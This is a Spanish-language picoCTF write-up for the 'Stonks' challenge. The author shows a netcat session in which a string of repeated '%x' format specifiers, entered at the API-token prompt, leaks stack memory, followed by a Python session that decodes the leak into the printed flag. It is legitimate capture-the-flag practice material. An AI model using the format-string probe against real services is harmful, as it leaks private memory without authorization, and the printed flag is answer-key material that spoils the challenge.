# Level X
## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`
## Pistas
Okay, maybe I'd believe you if you find my API key.
## Solucion
┌──(diego㉿kali)-[~]
└─$ nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xv
Buying stonks with token:
82dd430804b00080489c3f7f8bd80ffffffff182db160f7f99110f7f8bdc7082dc180182dd41082dd4306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8f007df7fc6af8f7f9944060802e0010f7e28ce9f7f9a0c0f7f8b5c0f7f8b000ff8f9718f7e1968df7f8b5c08048ecaff8f97240f7fadf09804b000f7f8b000f7f8be20ff8f9758f7fb3d50f7f8c89060802e00f7f8b000804b000ff8f97588048c8682db160ff8f9744ff8f97588048be9f7f8b3fc0ff8f980cff8f98041182db16060802e00ff8f977000f7dcefa1f7f8b000f7f8b0000f7dcefa11ff8f9804ff8f980cff8f979410f7f8b000f7fae70af7fc60000f7f8b0000073b4b3b6d54495a6000180486300f7fb3d50f7fae960804b00018048630080486628048b851ff8f98048048cd08048d30f7fae960ff8f97fcf7fc69401ff8fae790ff8faeb2ff8faebfff8faec8ff8faef7ff8faf2fff8faf4aff8faf6bff8faf73020f7f9eb5021f7f9e000101f8bfbff61000116438048034420597f7f9f0008098048630bv
Portfolio as of Sun May 21 19:00:50 UTC 2023
### Convertimos lo que nos dio de hex a ascii
┌──(diego㉿kali)-[~]
└─$ python                      
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s= 'ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ}'
>>> >>> for x in range (0,len(s),4):
  File "<stdin>", line 1
    >>> for x in range (0,len(s),4):
    ^^
SyntaxError: invalid syntax
>>> ...     print(s[x+3]+s[x+2]+s[x+1]+x[s],end='')
  File "<stdin>", line 1
    ...     print(s[x+3]+s[x+2]+s[x+1]+x[s],end='')
            ^^^^^
SyntaxError: invalid syntax
>>> ...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
  File "<stdin>", line 1
    ...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
            ^^^^^
SyntaxError: invalid syntax
>>> for x in range (0,len(s),4):
... 
  File "<stdin>", line 2
    
    ^
IndentationError: expected an indented block after 'for' statement on line 1
>>>     print(s[x+3]+s[x+2]+s[x+1]+x[s],end='')
  File "<stdin>", line 1
    print(s[x+3]+s[x+2]+s[x+1]+x[s],end='')
IndentationError: unexpected indent
>>> for x in range (0,len(s),4):
...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}>>> 

## Notas Adicionales
|comando|descripcion|
|-------|-----------|
|xxx|xxx|
## Referencias